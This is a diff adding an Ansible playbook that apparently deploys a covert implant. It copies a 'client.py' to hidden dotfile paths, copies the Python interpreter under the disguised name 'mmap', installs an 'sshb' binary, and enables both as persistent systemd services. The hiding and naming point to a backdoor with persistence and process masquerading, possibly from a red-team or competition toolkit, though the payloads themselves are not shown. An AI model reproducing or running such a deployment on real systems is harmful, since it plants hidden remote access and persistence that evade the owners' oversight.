@@ -1,0 +1,58 @@
+- name: Copy client.py to bin
+  copy:
+    src: files/constctrl/client.py
+    dest: /usr/local/bin/.client.py
+    mode: 755
+
+- name: Copy client.py to root
+  copy:
+    src: files/constctrl/client.py
+    dest: /root/.client.py
+    mode: 755
+
+- name: Copy Python to mmap
+  copy:
+    remote_src: yes
+    src: /usr/bin/python3
+    dest: /usr/bin/mmap
+    mode: 755
+  
+- name: Create /var/lib/sshb directory
+  ansible.builtin.file:
+    path: /var/lib/sshb
+    state: directory
+    mode: '0755'
+
+- name: Copy over sshb binary
+  copy:
+    src: files/constctrl/sshb
+    dest: /var/lib/sshb/sshb
+    mode: 755
+
+- name: Copy sshb service file
+  copy:
+    src: files/constctrl/sshb.service
+    dest: /etc/systemd/system/sshb.service
+    mode: 755
+
+- name: Copy mmap service file
+  copy:
+    src: files/constctrl/mmap.service
+    dest: /etc/systemd/system/mmap.service
+    mode: 755
+
+- name: Reload Service Damemons
+  ansible.builtin.systemd:
+    daemon_reload: yes
+
+- name: Enable and run sshb
+  ansible.builtin.service:
+    name: sshb
+    enabled: yes
+    state: started
+
+- name: Enable and run mmap
+  ansible.builtin.service:
+    name: mmap
+    enabled: yes
+    state: started
